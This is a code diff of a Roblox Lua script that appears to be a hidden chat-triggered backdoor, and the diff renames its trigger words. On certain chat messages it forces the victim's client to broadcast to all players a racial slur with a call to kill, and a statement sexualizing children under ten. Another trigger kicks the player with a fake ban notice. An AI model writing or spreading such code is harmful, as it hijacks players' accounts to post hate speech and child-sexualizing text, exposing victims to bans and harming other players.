@@ -27,9 +27,9 @@ local function onChatMessage(message, speaker)
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("EVERYONE KILL THESE NIGGERS", "All")
     elseif message == "TCHAT" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Test Chat Works", "All")
-    elseif message == "Pban" then
+    elseif message == "asaiya" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Want to Fuck kids, specially those 10 years or younger. They have the tightest Pussies.", "All")
-    elseif message:lower() == "Tban" then
+    elseif message:lower() == "Asaiya" then
         -- Kick the local player
         game:GetService("Players").LocalPlayer:Kick("You Have Been Banned From Entering The Game! ")
     end
